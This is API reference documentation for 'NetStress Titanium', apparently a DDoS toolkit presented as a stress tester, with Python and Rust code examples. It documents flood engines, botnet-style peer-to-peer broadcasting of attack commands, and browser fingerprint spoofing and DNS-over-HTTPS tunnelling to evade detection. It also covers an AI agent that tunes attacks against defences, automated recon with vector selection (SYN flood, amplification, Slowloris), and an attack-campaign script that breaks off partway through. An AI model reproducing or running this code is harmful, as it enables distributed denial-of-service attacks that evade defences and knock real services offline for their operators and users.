# NetStress Titanium v3.0 API Reference

## Core Engine API

### TitaniumEngine

The revolutionary Titanium engine class that provides 40Gbps+ throughput with true kernel bypass, GPU acceleration, and AI-driven adaptation.

```python
from core.titanium_engine import TitaniumEngine, EngineConfig

class TitaniumEngine:
    def __init__(self, config: EngineConfig)
```

#### Parameters

- `config` (EngineConfig): Comprehensive configuration object with Titanium features

#### Methods

##### `start() -> None`

Starts the Titanium packet generation engine with automatic backend selection.

```python
config = EngineConfig(
    target="127.0.0.1",
    port=80,
    backend="afxdp",  # Auto-selects optimal backend
    gpu_acceleration=True,
    ai_adaptation=True
)
engine = TitaniumEngine(config)
engine.start()
```

##### `stop() -> None`

Stops the engine and releases all resources (GPU memory, network buffers, P2P connections).

```python
engine.stop()
```

##### `get_observation_state() -> ObservationState`

Returns AI-compatible observation state for reinforcement learning.

```python
state = engine.get_observation_state()
print(f"Latency Delta: {state.latency_delta}ms")
print(f"Drop Rate: {state.packet_drop_rate:.2%}")
print(f"Response Codes: {state.http_response_codes}")
```

##### `execute_action(action: ActionSpace) -> None`

Executes an AI-selected action to optimize performance.

```python
from core.ai.rl_agent import ActionSpace

action = ActionSpace.IncreasePPS(50000)
engine.execute_action(action)

action = ActionSpace.ChangeJA4Profile("firefox_121")
engine.execute_action(action)
```

##### `get_stats() -> TitaniumStats`

Returns comprehensive Titanium performance statistics.

```python
stats = engine.get_stats()
print(f"PPS: {stats.pps:,}, Backend: {stats.backend}")
print(f"GPU Active: {stats.gpu_active}, P2P Nodes: {stats.p2p_node_count}")
```

##### Context Manager Support

```python
with TitaniumEngine(config) as engine:
    engine.start()
    # Engine automatically stops and cleans up resources
```

### TitaniumConfig

Comprehensive configuration class for Titanium engine with advanced features.

```python
from core.titanium_engine import TitaniumConfig, Protocol, BackendType
from core.evasion.ja4_spoof import JA4Profile
from core.distributed.p2p_mesh import P2PConfig

@dataclass
class TitaniumConfig:
    # Basic configuration
    target: str
    port: int
    protocol: Protocol = Protocol.UDP

    # Performance configuration
    backend: BackendType = BackendType.AUTO
    threads: int = 0  # 0 = auto-detect
    rate_limit: Optional[int] = None
    packet_size: int = 64
    duration: Optional[float] = None

    # Titanium features
    gpu_acceleration: bool = False
    ai_adaptation: bool = False
    performance_target: str = "auto"  # "1gbps", "10gbps", "40gbps", "auto"

    # Evasion configuration
    ja4_profile: Optional[str] = None
    timing_pattern: str = "constant"  # "constant", "poisson", "human"
    doh_tunnel: bool = False
    header_randomization: bool = False

    # P2P configuration
    p2p_enabled: bool = False
    bootstrap_nodes: List[str] = field(default_factory=list)
    encryption_key: Optional[str] = None

    # Kill chain configuration
    kill_chain_enabled: bool = False
    auto_recon: bool = False
    auto_vector_selection: bool = False
```

#### Examples

##### Basic High-Performance Configuration

```python
config = TitaniumConfig(
    target="192.168.1.100",
    port=80,
    backend=BackendType.AFXDP,  # Linux AF_XDP
    rate_limit=10000000,  # 10M PPS
    gpu_acceleration=True,
    performance_target="40gbps"
)
```

##### AI-Driven Adaptive Configuration

```python
config = TitaniumConfig(
    target="example.com",
    port=443,
    protocol=Protocol.HTTPS,
    ai_adaptation=True,
    ja4_profile="chrome_120",
    timing_pattern="human",
    header_randomization=True
)
```

##### Distributed P2P Configuration

```python
config = TitaniumConfig(
    target="192.168.1.0/24",
    port=80,
    p2p_enabled=True,
    bootstrap_nodes=[
        "/ip4/192.168.1.100/tcp/4001/p2p/12D3KooWExample1",
        "/ip4/192.168.1.101/tcp/4001/p2p/12D3KooWExample2"
    ],
    kill_chain_enabled=True,
    auto_vector_selection=True
)
```

### TitaniumStats

Comprehensive statistics returned by the Titanium engine.

```python
@dataclass
class TitaniumStats:
    # Basic statistics
    packets_sent: int
    bytes_sent: int
    errors: int
    duration: float

    # Performance metrics
    pps: float              # Packets per second
    bps: float              # Bits per second
    gbps: float             # Gigabits per second

    # Backend information
    backend: str            # Active backend name ("afxdp", "rio", "network", "gpu")
    backend_fallback_count: int  # Number of backend fallbacks

    # GPU acceleration
    gpu_active: bool        # GPU acceleration enabled
    gpu_memory_used: int    # GPU memory usage in bytes
    gpu_pps: float          # GPU-generated packets per second

    # AI adaptation
    ai_active: bool         # AI adaptation enabled
    current_ja4_profile: str  # Active JA4 profile
    adaptation_count: int   # Number of AI adaptations

    # P2P mesh
    p2p_active: bool        # P2P mesh enabled
    p2p_node_count: int     # Connected peer nodes
    p2p_latency_ms: float   # Average P2P latency

    # Evasion metrics
    doh_tunnel_active: bool # DoH tunneling active
    timing_pattern: str     # Current timing pattern
    evasion_success_rate: float  # Estimated evasion success rate
```

## Rust Engine API (PyO3 Bindings)

### PacketEngine Trait

The core Rust trait that all platform backends implement.

```rust
use netstress::engines::{PacketEngine, EngineConfig, EngineStats, EngineError};

pub trait PacketEngine: Send + Sync {
    fn init(&mut self, config: &EngineConfig) -> Result<(), EngineError>;
    fn start(&mut self) -> Result<(), EngineError>;
    fn stop(&mut self) -> Result<(), EngineError>;
    fn get_stats(&self) -> EngineStats;
    fn set_rate(&mut self, pps: u64) -> Result<(), EngineError>;
    fn backend_name(&self) -> &'static str;
}
```

### Platform-Specific Backends

#### Linux AF_XDP Backend

```rust
use netstress::engines::linux::LinuxXdpEngine;

// Create AF_XDP engine
let mut engine = LinuxXdpEngine::new("eth0")?;
engine.init(&config)?;
engine.start()?;

// Get statistics
let stats = engine.get_stats();
println!("PPS: {}, Backend: {}", stats.pps, engine.backend_name());
```

#### Windows RIO Backend

```rust
use netstress::engines::windows::WindowsRioEngine;

// Create RIO engine
let mut engine = WindowsRioEngine::new("192.168.1.100", 80)?;
engine.init(&config)?;
engine.start()?;
```

#### macOS Network.framework Backend

```rust
use netstress::engines::macos::MacOsNetworkEngine;

// Create Network.framework engine
let mut engine = MacOsNetworkEngine::new("192.168.1.100", 80)?;
engine.init(&config)?;
engine.start()?;
```

#### GPU CUDA Backend

```rust
use netstress::engines::cuda::CudaEngine;

// Create CUDA engine
let mut engine = CudaEngine::new()?;
engine.upload_packet_templates(&templates)?;
engine.generate_packets(1000000)?;
```

### P2P Mesh (libp2p)

```rust
use netstress::p2p::{P2PMesh, AttackCommand};

// Create P2P mesh
let mut mesh = P2PMesh::new(bootstrap_nodes).await?;

// Broadcast attack command
let command = AttackCommand {
    target: "192.168.1.100".to_string(),
    port: 80,
    protocol: Protocol::Udp,
    rate: 1000000,
    duration: 60,
};

mesh.broadcast_command(command).await?;
```

### JA4+ Fingerprinting

```rust
use netstress::evasion::{JA4Spoofer, BrowserProfile};

// Create JA4 spoofer
let mut spoofer = JA4Spoofer::new();

// Set browser profile
spoofer.set_profile(BrowserProfile::Chrome120Windows)?;

// Generate ClientHello
let client_hello = spoofer.build_client_hello("example.com")?;
let ja4_hash = spoofer.get_ja4_hash();
```

## AI/ML API

### Reinforcement Learning Agent

```python
from core.ai.rl_agent import RLAgent, ObservationState, ActionSpace

class RLAgent:
    def __init__(self, model_path: str, device: str = "auto")
```

#### Methods

##### `load_model(model_path: str) -> None`

Loads an ONNX model for inference.

```python
agent = RLAgent("models/adaptive_attack.onnx")
```

##### `select_action(state: ObservationState) -> ActionSpace`

Selects optimal action based on current state.

```python
state = ObservationState(
    latency_delta=50.0,  # ms
    packet_drop_rate=0.02,  # 2%
    http_response_codes=[200, 200, 403, 200],
    current_pps=100000
)

action = agent.select_action(state)
print(f"Selected action: {action}")
```

##### `update_model(reward: float, state: ObservationState, action: ActionSpace) -> None`

Updates model weights using policy gradient (online learning mode).

```python
reward = calculate_reward(stats)
agent.update_model(reward, state, action)
```

### Observation State

```python
@dataclass
class ObservationState:
    latency_delta: float        # Change in response latency (ms)
    packet_drop_rate: float     # Packet loss rate (0.0-1.0)
    http_response_codes: List[int]  # Recent HTTP response codes
    current_pps: int            # Current packets per second
    bandwidth_utilization: float # Network bandwidth usage (0.0-1.0)
    cpu_usage: float            # CPU usage percentage (0.0-1.0)
    memory_usage: float         # Memory usage percentage (0.0-1.0)

    def to_tensor(self, device: str) -> torch.Tensor:
        """Convert to PyTorch tensor for model input"""
```

### Action Space

```python
from enum import Enum

class ActionSpace(Enum):
    # Rate control actions
    INCREASE_PPS = "increase_pps"
    DECREASE_PPS = "decrease_pps"

    # Evasion actions
    CHANGE_JA4_PROFILE = "change_ja4_profile"
    SWITCH_TIMING_PATTERN = "switch_timing_pattern"
    ENABLE_DOH_TUNNEL = "enable_doh_tunnel"

    # Protocol actions
    SWITCH_PROTOCOL = "switch_protocol"
    CHANGE_WINDOW_SIZE = "change_window_size"

    # Advanced actions
    MORPH_TRAFFIC = "morph_traffic"
    ROTATE_ENDPOINTS = "rotate_endpoints"

# Action execution
action = ActionSpace.CHANGE_JA4_PROFILE
engine.execute_action(action, parameters={"profile": "firefox_121"})
```

## P2P Distributed API

### P2PMesh

Decentralized peer-to-peer coordination with Kademlia DHT.

```python
from core.distributed.p2p_mesh import P2PMesh, AttackCommand

class P2PMesh:
    def __init__(self, bootstrap_nodes: List[str], encryption_key: Optional[str] = None)
```

#### Methods

##### `join_network() -> None`

Joins the P2P mesh network.

```python
mesh = P2PMesh(bootstrap_nodes=[
    "/ip4/192.168.1.100/tcp/4001/p2p/12D3KooWExample1"
])
await mesh.join_network()
```

##### `broadcast_command(command: AttackCommand) -> None`

Broadcasts attack command to all peers via GossipSub.

```python
command = AttackCommand(
    target="192.168.1.200",
    port=80,
    protocol="udp",
    rate_per_node=50000,
    duration=60,
    coordination_delay=5  # seconds
)

await mesh.broadcast_command(command)
```

##### `get_peer_count() -> int`

Returns number of connected peers.

```python
peer_count = mesh.get_peer_count()
print(f"Connected to {peer_count} peers")
```

##### `get_network_stats() -> NetworkStats`

Returns P2P network statistics.

```python
stats = mesh.get_network_stats()
print(f"Average latency: {stats.avg_latency_ms}ms")
print(f"Message success rate: {stats.message_success_rate:.2%}")
```

### AttackCommand

```python
@dataclass
class AttackCommand:
    target: str                 # Target IP or hostname
    port: int                   # Target port
    protocol: str               # Protocol ("udp", "tcp", "http", etc.)
    rate_per_node: int          # PPS per participating node
    duration: int               # Attack duration in seconds
    coordination_delay: int = 0 # Delay before starting (for synchronization)

    # Advanced options
    ja4_profile: Optional[str] = None
    timing_pattern: str = "constant"
    evasion_enabled: bool = False

    # Kill chain options
    auto_recon: bool = False
    vector_selection: str = "auto"  # "auto", "manual", "adaptive"
```

### Noise Protocol Encryption

```python
from core.distributed.encryption import NoiseProtocol

# Create encrypted channel
noise = NoiseProtocol()
keypair = noise.generate_keypair()

# Encrypt message
plaintext = b"attack_command_data"
ciphertext = noise.encrypt(plaintext, peer_public_key)

# Decrypt message
decrypted = noise.decrypt(ciphertext, peer_public_key)
```

## Hardware Detection API

### HardwareProfile

Comprehensive hardware detection and classification.

```python
from core.hardware.detector import HardwareProfile

class HardwareProfile:
    @classmethod
    def detect(cls) -> 'HardwareProfile'
```

#### Properties

```python
profile = HardwareProfile.detect()

# CPU Information
print(f"CPU: {profile.cpu.cores} cores, {profile.cpu.architecture.name}")
print(f"Features: AVX2={profile.cpu.features.avx2}, NEON={profile.cpu.features.neon}")

# Memory Information
print(f"RAM: {profile.memory.total_gb:.1f}GB total, {profile.memory.available_gb:.1f}GB available")

# Network Information
print(f"NIC: {profile.network.speed_mbps}Mbps, Offload={profile.network.has_offload}")

# Device Tier
print(f"Tier: {profile.tier.name}")
```

#### Methods

##### `get_optimal_config() -> EngineConfig`

Returns optimized configuration for detected hardware.

```python
profile = HardwareProfile.detect()
config = profile.get_optimal_config()
```

##### `get_recommended_backend() -> BackendType`

Returns the best backend for this platform.

```python
backend = profile.get_recommended_backend()
print(f"Recommended backend: {backend.name}")
```

### DeviceTier

Hardware classification enumeration.

```python
from core.hardware.detector import DeviceTier

class DeviceTier(Enum):
    LOW = "low"           # 1-2 cores, <4GB RAM, 100Mbps NIC
    MEDIUM = "medium"     # 4-8 cores, 4-16GB RAM, 1Gbps NIC
    HIGH = "high"         # 8-32 cores, 16-64GB RAM, 10Gbps NIC
    ENTERPRISE = "enterprise"  # 32+ cores, 64GB+ RAM, 25Gbps+ NIC
```

## Backend Detection API

### BackendDetector

Cross-platform backend detection and selection.

```python
from core.platform.backend_detection import BackendDetector, detect_system_capabilities

# Detect system capabilities
caps = detect_system_capabilities()
print(f"Platform: {caps.platform}")
print(f"Available backends: {[b.name for b in caps.available_backends]}")

# Create detector
detector = BackendDetector()
best_backend = detector.select_best_backend(caps)
print(f"Selected backend: {best_backend.name}")
```

### SystemCapabilities

System capability information.

```python
@dataclass
class SystemCapabilities:
    platform: str                    # "Windows", "Darwin", "Linux"
    kernel_version_major: int
    kernel_version_minor: int
    has_raw_socket: bool
    has_dpdk: bool                   # Linux only
    has_af_xdp: bool                 # Linux 4.18+
    has_io_uring: bool               # Linux 5.1+
    has_sendmmsg: bool               # Linux 3.0+
    has_rio: bool                    # Windows Server 2016+
    has_iocp: bool                   # Windows
    has_network_framework: bool      # macOS Ventura+
    has_kqueue: bool                 # macOS/BSD
    available_backends: List[BackendType]
```

## Kill Chain Automation API

### ReconModule

Automated reconnaissance and target profiling.

```python
from core.killchain.recon import ReconModule, TargetProfile

class ReconModule:
    def __init__(self, timeout: int = 30)
```

#### Methods

##### `scan_target(target: str) -> TargetProfile`

Performs comprehensive target reconnaissance.

```python
recon = ReconModule()
profile = recon.scan_target("192.168.1.100")

print(f"Open ports: {profile.open_ports}")
print(f"Services: {profile.services}")
print(f"OS: {profile.os_fingerprint}")
print(f"WAF detected: {profile.waf_detected}")
```

##### `port_scan(target: str, ports: List[int]) -> Dict[int, bool]`

Fast SYN port scanning.

```python
open_ports = recon.port_scan("192.168.1.100", [80, 443, 8080, 8443])
print(f"Open ports: {[p for p, open in open_ports.items() if open]}")
```

##### `banner_grab(target: str, port: int) -> str`

Service banner grabbing and version detection.

```python
banner = recon.banner_grab("192.168.1.100", 80)
print(f"HTTP server: {banner}")
```

### VectorSelector

Intelligent attack vector selection based on target profile.

```python
from core.killchain.vector_selector import VectorSelector, AttackVector

class VectorSelector:
    def __init__(self, effectiveness_threshold: float = 0.8)
```

#### Methods

##### `select_vectors(profile: TargetProfile) -> List[AttackVector]`

Selects optimal attack vectors for target.

```python
selector = VectorSelector()
vectors = selector.select_vectors(profile)

for vector in vectors:
    print(f"Vector: {vector.name}, Effectiveness: {vector.effectiveness:.2%}")
```

##### `get_recommended_config(vector: AttackVector) -> TitaniumConfig`

Returns optimized configuration for selected vector.

```python
config = selector.get_recommended_config(vectors[0])
engine = TitaniumEngine(config)
```

### AttackVector

```python
@dataclass
class AttackVector:
    name: str                   # Vector name ("slowloris", "http2_flood", etc.)
    protocol: str               # Target protocol
    effectiveness: float        # Estimated effectiveness (0.0-1.0)
    stealth_level: float        # Stealth rating (0.0-1.0)
    resource_cost: float        # Resource requirements (0.0-1.0)

    # Configuration
    recommended_rate: int       # Recommended PPS
    recommended_duration: int   # Recommended duration
    evasion_config: Dict[str, Any]  # Evasion parameters
```

#### Supported Attack Vectors

- **Layer 4**: UDP flood, TCP SYN flood, ICMP flood
- **Layer 7**: HTTP GET/POST flood, Slowloris, RUDY, HTTP/2 PING flood
- **Amplification**: DNS, NTP, SSDP, Memcached amplification
- **Application**: WordPress XML-RPC, GraphQL depth attacks, WebSocket flood

## Single Binary API

### Binary Configuration

The single binary supports all API features through embedded Python interpreter.

```bash
# Check binary capabilities
./netstress --check-capabilities

# List available backends
./netstress --list-backends

# Test specific backend
./netstress --test-backend afxdp

# Benchmark performance
./netstress --benchmark --duration 30
```

### Embedded Python Access

```python
# Access full API from within binary
import netstress

# Create engine (same API as development mode)
config = netstress.TitaniumConfig(
    target="127.0.0.1",
    port=80,
    backend="afxdp",
    gpu_acceleration=True
)

engine = netstress.TitaniumEngine(config)
```

### Binary-Specific Features

```python
from netstress.binary import BinaryInfo, get_build_info

# Get binary information
info = get_build_info()
print(f"Version: {info.version}")
print(f"Build date: {info.build_date}")
print(f"Platform: {info.platform}")
print(f"Features: {info.enabled_features}")

# Check embedded components
print(f"Python version: {info.python_version}")
print(f"Rust version: {info.rust_version}")
print(f"CUDA support: {info.cuda_available}")
```

## Security & Evasion API

### JA4+ Fingerprint Spoofing

Complete JA4/JA4S/JA4H/JA4X browser fingerprint spoofing with byte-perfect accuracy.

```python
from core.evasion.ja4_spoof import JA4Spoofer, BrowserProfile

class JA4Spoofer:
    def __init__(self, profile: Optional[BrowserProfile] = None)
```

#### Methods

##### `set_profile(profile: BrowserProfile) -> None`

Sets browser profile for fingerprint spoofing.

```python
spoofer = JA4Spoofer()
spoofer.set_profile(BrowserProfile.CHROME_120_WINDOWS)

# Or use string identifier
spoofer.set_profile_by_name("firefox_121_linux")
```

##### `build_client_hello(hostname: str) -> bytes`

Generates byte-perfect TLS ClientHello matching the profile.

```python
client_hello = spoofer.build_client_hello("example.com")
print(f"ClientHello size: {len(client_hello)} bytes")
```

##### `get_ja4_variants() -> Dict[str, str]`

Returns all JA4 variant hashes for current profile.

```python
variants = spoofer.get_ja4_variants()
print(f"JA4: {variants['ja4']}")
print(f"JA4S: {variants['ja4s']}")
print(f"JA4H: {variants['ja4h']}")
print(f"JA4X: {variants['ja4x']}")
```

##### `morph_fingerprint(target_ja4: str) -> None`

Dynamically morphs fingerprint to match target JA4 hash.

```python
# Morph to match specific JA4 hash
target_hash = "t13d1516h2_8daaf6152771_e56c7340033f"
spoofer.morph_fingerprint(target_hash)
```

#### Available Browser Profiles

**Chrome Profiles:**

- `CHROME_120_WINDOWS` - Chrome 120+ on Windows 11
- `CHROME_120_MACOS` - Chrome 120+ on macOS Sonoma
- `CHROME_120_LINUX` - Chrome 120+ on Ubuntu 22.04
- `CHROME_121_ANDROID` - Chrome 121+ on Android 14

**Firefox Profiles:**

- `FIREFOX_121_WINDOWS` - Firefox 121+ on Windows 11
- `FIREFOX_121_MACOS` - Firefox 121+ on macOS Sonoma
- `FIREFOX_121_LINUX` - Firefox 121+ on Ubuntu 22.04

**Safari Profiles:**

- `SAFARI_17_MACOS` - Safari 17+ on macOS Sonoma
- `SAFARI_17_IOS` - Safari 17+ on iOS 17

**Edge Profiles:**

- `EDGE_120_WINDOWS` - Edge 120+ on Windows 11

#### HTTP/2 Fingerprinting Evasion

```python
from core.evasion.http2_spoof import HTTP2Spoofer

spoofer = HTTP2Spoofer()

# Configure SETTINGS frame to match browser
spoofer.set_settings_frame({
    'HEADER_TABLE_SIZE': 65536,
    'ENABLE_PUSH': 1,
    'MAX_CONCURRENT_STREAMS': 1000,
    'INITIAL_WINDOW_SIZE': 6291456,
    'MAX_FRAME_SIZE': 16384,
    'MAX_HEADER_LIST_SIZE': 262144
})

# Generate AKAMAI-compliant connection
connection = spoofer.create_connection("example.com", 443)
```

### DNS-over-HTTPS Tunneling

```python
from core.antidetect.doh_tunnel import DohTunnel

# Create DoH tunnel
tunnel = DohTunnel("https://8.8.8.8/dns-query")

# Encapsulate payload
payload = b"attack_data_here"
encapsulated = tunnel.encapsulate(payload)

# Send via HTTPS (appears as normal DNS query)
response = tunnel.send_query(encapsulated)

# Decapsulate response
original_data = tunnel.decapsulate(response)
```

#### Supported DoH Servers

- `https://8.8.8.8/dns-query` - Google Public DNS
- `https://1.1.1.1/dns-query` - Cloudflare DNS
- `https://9.9.9.9:5053/dns-query` - Quad9 DNS

### Traffic Morphing

```python
from core.antidetect.traffic_morph import ProtocolMorpher, MorphType

# Create morpher
morpher = ProtocolMorpher(MorphType.HTTP2_FRAME)

# Morph payload to look like HTTP/2
payload = b"original_data"
morphed = morpher.morph(payload)

# Morphed data appears as valid HTTP/2 DATA frame
print(f"Original: {len(payload)} bytes")
print(f"Morphed: {len(morphed)} bytes (valid HTTP/2)")

# Unmorph at destination
original = morpher.unmorph(morphed)
assert original == payload
```

#### Supported Morph Types

- `HTTP2_FRAME` - Valid HTTP/2 DATA frames
- `HTTP3_QUIC` - Valid QUIC packets
- `WEBSOCKET_FRAME` - Valid WebSocket frames with masking
- `DNS_QUERY` - Valid DNS query structures
- `TLS_RECORD` - Valid TLS record layer

## P2P Coordination API

### KademliaNode

Distributed peer-to-peer coordination.

```python
from core.distributed.kademlia import KademliaNode, AttackConfig

# Create P2P node
node = KademliaNode(bind_addr=("0.0.0.0", 8000))

# Bootstrap from seed nodes
seed_nodes = [("192.168.1.100", 8000), ("192.168.1.101", 8000)]
await node.bootstrap(seed_nodes)

# Find peers for distributed attack
peers = node.find_peers(target_id)
print(f"Found {len(peers)} peers")

# Broadcast attack configuration
attack_config = AttackConfig(
    target="192.168.1.200",
    port=80,
    rate_per_node=10000,
    duration=60
)
await node.broadcast_attack(attack_config)

# Join attack swarm
swarm_id = b"attack_swarm_001"
await node.join_swarm(swarm_id)
```

## Utility Functions

### Packet Building

```python
from core.native_engine import build_packet, Protocol

# Build UDP packet
udp_packet = build_packet(
    target="192.168.1.100",
    port=80,
    protocol=Protocol.UDP,
    payload=b"test_data"
)

# Build TCP SYN packet
tcp_packet = build_packet(
    target="192.168.1.100",
    port=443,
    protocol=Protocol.TCP,
    tcp_flags={"syn": True}
)
```

### Quick Titanium Flood

```python
from core.titanium_engine import quick_titanium_flood

# High-performance flood with auto-optimization
stats = quick_titanium_flood(
    target="127.0.0.1",
    port=80,
    duration=10,
    performance_target="10gbps",  # Auto-selects rate for target throughput
    backend="auto",  # Auto-selects optimal backend
    gpu_acceleration=True,
    ai_adaptation=True
)
print(f"Sent {stats.packets_sent:,} packets at {stats.gbps:.2f} Gbps")
```

### Titanium Capabilities Check

```python
from core.titanium_engine import get_titanium_capabilities, check_backend_support

# Check comprehensive Titanium capabilities
caps = get_titanium_capabilities()
print(f"Platform: {caps.platform}")
print(f"CPU cores: {caps.cpu_count}")
print(f"Available backends: {caps.available_backends}")
print(f"GPU support: {caps.gpu_available}")
print(f"P2P support: {caps.p2p_available}")
print(f"AI models: {caps.ai_models_available}")

# Check specific backend support
backend_support = check_backend_support()
print(f"AF_XDP: {backend_support.afxdp}")
print(f"RIO: {backend_support.rio}")
print(f"Network.framework: {backend_support.network_framework}")
print(f"CUDA: {backend_support.cuda}")
```

### Performance Benchmarking

```python
from core.titanium_engine import TitaniumBenchmark

# Comprehensive performance benchmark
benchmark = TitaniumBenchmark()
results = benchmark.run_full_benchmark(duration=30)

print("Benchmark Results:")
for backend, stats in results.items():
    print(f"  {backend}: {stats.pps:,.0f} PPS, {stats.gbps:.2f} Gbps")

# Backend-specific benchmark
afxdp_results = benchmark.benchmark_backend("afxdp", duration=10)
print(f"AF_XDP Performance: {afxdp_results.pps:,.0f} PPS")
```

## Configuration Management

### Global Configuration

```python
from core.config.settings import GlobalConfig

# Load configuration
config = GlobalConfig.load()

# Modify settings
config.default_rate_limit = 100000
config.enable_logging = True
config.log_level = "INFO"

# Save configuration
config.save()
```

### Environment Variables

NetStress Titanium respects the following environment variables:

```bash
# Titanium performance settings
export NETSTRESS_TITANIUM_BACKEND=auto  # auto, afxdp, rio, network, gpu
export NETSTRESS_TITANIUM_THREADS=32
export NETSTRESS_TITANIUM_RATE=10000000
export NETSTRESS_TITANIUM_GPU=true

# Performance targets
export NETSTRESS_PERFORMANCE_TARGET=40gbps  # 1gbps, 10gbps, 40gbps, auto
export NETSTRESS_BUFFER_SIZE=2147483648     # 2GB for high performance

# AI/ML settings
export NETSTRESS_AI_MODEL_PATH=models/adaptive_attack.onnx
export NETSTRESS_AI_DEVICE=cuda  # cpu, cuda, auto
export NETSTRESS_AI_LEARNING_RATE=0.001

# P2P mesh settings
export NETSTRESS_P2P_BOOTSTRAP_NODES=/ip4/127.0.0.1/tcp/4001/p2p/12D3KooWExample
export NETSTRESS_P2P_ENCRYPTION_KEY=your_encryption_key_here
export NETSTRESS_P2P_PORT=4001

# Evasion settings
export NETSTRESS_JA4_PROFILE=chrome_120
export NETSTRESS_TIMING_PATTERN=poisson
export NETSTRESS_DOH_TUNNEL=true
export NETSTRESS_HEADER_RANDOMIZATION=true

# Kill chain settings
export NETSTRESS_KILL_CHAIN=true
export NETSTRESS_AUTO_RECON=true
export NETSTRESS_AUTO_VECTOR_SELECTION=true

# Security settings
export NETSTRESS_ENABLE_SAFETY=true
export NETSTRESS_MAX_RATE=100000000  # 100M PPS limit
export NETSTRESS_MAX_BANDWIDTH=40gbps

# Logging
export NETSTRESS_LOG_LEVEL=INFO
export NETSTRESS_LOG_FILE=/var/log/netstress-titanium.log
export NETSTRESS_TELEMETRY_EXPORT=prometheus  # prometheus, influxdb, json
```

## Error Handling

### Titanium Exception Types

```python
from core.titanium_engine import (
    TitaniumError,
    BackendError,
    GPUError,
    P2PError,
    AIModelError,
    EvasionError,
    KillChainError,
    ConfigurationError,
    NetworkError,
    SecurityError
)

try:
    config = TitaniumConfig(target="invalid.target", port=80, gpu_acceleration=True)
    engine = TitaniumEngine(config)
    engine.start()
except GPUError as e:
    print(f"GPU acceleration error: {e}")
except P2PError as e:
    print(f"P2P mesh error: {e}")
except AIModelError as e:
    print(f"AI model error: {e}")
except BackendError as e:
    print(f"Backend error: {e}")
except TitaniumError as e:
    print(f"Titanium engine error: {e}")
```

### Titanium Error Recovery

```python
from core.titanium_engine import TitaniumEngine, TitaniumConfig, BackendType
import time

def robust_titanium_flood(target, port, duration):
    """Titanium flood with comprehensive error recovery"""

    # Primary configuration with all features
    primary_config = TitaniumConfig(
        target=target,
        port=port,
        backend=BackendType.AUTO,
        gpu_acceleration=True,
        ai_adaptation=True,
        p2p_enabled=True
    )

    try:
        with TitaniumEngine(primary_config) as engine:
            engine.start()
            time.sleep(duration)
            return engine.get_stats()

    except GPUError:
        print("GPU acceleration failed, disabling GPU...")
        primary_config.gpu_acceleration = False

    except P2PError:
        print("P2P mesh failed, running standalone...")
        primary_config.p2p_enabled = False

    except BackendError as e:
        print(f"Backend {e.backend} failed, trying fallback chain...")

        # Try fallback backends in order
        fallback_backends = [BackendType.AFXDP, BackendType.RIO,
                           BackendType.NETWORK_FRAMEWORK, BackendType.SENDMMSG]

        for backend in fallback_backends:
            try:
                fallback_config = TitaniumConfig(
                    target=target,
                    port=port,
                    backend=backend,
                    gpu_acceleration=False,  # Disable advanced features for stability
                    ai_adaptation=False
                )

                with TitaniumEngine(fallback_config) as engine:
                    engine.start()
                    time.sleep(duration)
                    return engine.get_stats()

            except BackendError:
                continue

    except AIModelError:
        print("AI model failed, using manual parameters...")
        primary_config.ai_adaptation = False

    except NetworkError as e:
        print(f"Network error: {e}")
        # Implement exponential backoff retry
        for attempt in range(3):
            time.sleep(2 ** attempt)
            try:
                with TitaniumEngine(primary_config) as engine:
                    engine.start()
                    time.sleep(duration)
                    return engine.get_stats()
            except NetworkError:
                continue

    raise TitaniumError("All recovery attempts failed")
```

## Performance Monitoring

### Real-Time Titanium Monitoring

```python
from core.titanium_engine import TitaniumEngine, TitaniumConfig
from core.ai.rl_agent import RLAgent
import time

config = TitaniumConfig(
    target="127.0.0.1",
    port=80,
    backend="afxdp",
    gpu_acceleration=True,
    ai_adaptation=True,
    p2p_enabled=True
)

engine = TitaniumEngine(config)
rl_agent = RLAgent("models/adaptive_attack.onnx")

with engine:
    engine.start()

    # Monitor comprehensive Titanium performance
    for i in range(60):  # 1 minute monitoring
        time.sleep(1)

        # Get comprehensive stats
        stats = engine.get_stats()

        # AI adaptation
        if stats.ai_active:
            state = engine.get_observation_state()
            action = rl_agent.select_action(state)
            engine.execute_action(action)

        # Display comprehensive metrics
        print(f"Time: {i+1:2d}s | "
              f"PPS: {stats.pps:10,.0f} | "
              f"Gbps: {stats.gbps:6.2f} | "
              f"Backend: {stats.backend:8s} | "
              f"GPU: {'✓' if stats.gpu_active else '✗'} | "
              f"P2P: {stats.p2p_node_count:3d} nodes | "
              f"JA4: {stats.current_ja4_profile:12s} | "
              f"Evasion: {stats.evasion_success_rate:5.1%}")

        # Alert on performance degradation
        if stats.pps < config.rate_limit * 0.8:
            print(f"⚠️  Performance warning: {stats.pps:,.0f} PPS below target")

        # Alert on P2P issues
        if config.p2p_enabled and stats.p2p_node_count < 5:
            print(f"⚠️  P2P warning: Only {stats.p2p_node_count} nodes connected")
```

### Telemetry Export

```python
from core.analytics.telemetry import TelemetryExporter

# Export to Prometheus
exporter = TelemetryExporter.prometheus(port=9090)
exporter.start()

# Export to InfluxDB
exporter = TelemetryExporter.influxdb(
    host="localhost",
    port=8086,
    database="netstress"
)
exporter.start()

# Export to JSON file
exporter = TelemetryExporter.json_file("stats.json")
exporter.start()
```

## Complete Example: Titanium Attack Campaign

```python
from core.titanium_engine import TitaniumEngine, TitaniumConfig
from core.ai.rl_agent import RLAgent
from core.distributed.p2p_mesh import P2PMesh, AttackCommand
from core.killchain.recon import ReconModule
from core.killchain.vector_selector import VectorSelector
import asyncio

async def titanium_attack_campaign(target: str):
    """
    Complete Titanium attack campaign with:
    - Automated reconnaissance
    - Intelligent vector selection
    - AI-driven adaptation
    - P2P distributed coordination
    - Advanced evasion
    """

    # Phase 1: Reconnaissance
    print("[*] Phase 1: Reconnaissance")
    recon = ReconModule()
    profile = recon.scan_target(target)
    print(f"[+] Target profile: {profile.os_fingerprint}")
    print(f"[+] Open ports: {profile.open_ports}")
    print(f"[+] Services: {profile.services}")
    print(f"[+] WAF detected: {profile.waf_detected}")

    # Phase 2: Vector Selection
    print("\n[*] Phase 2: Attack Vector Selection")
    selector = VectorSelector()
    vectors = selector.select_vectors(profile)
    best_vector = vectors[0]
    print(f"[+] Selected vector: {best_vector.name}")
    print(f"[+] Effectiveness: {best_vector.effectiveness:.2%}")

    # Phase 3: P2P Mesh Setup
    print("\n[*] Phase 3: P2P Mesh Coordination")
    mesh = P2PMesh(bootstrap_nodes=[
        "/ip4/192.168.1.100/tcp/4001/p2p/12D3KooWExample1"
    ])
    await mesh.join_network()
    peer_count = mesh.get_peer_count()
    print(f"[+] Connected to {peer_count} peers")

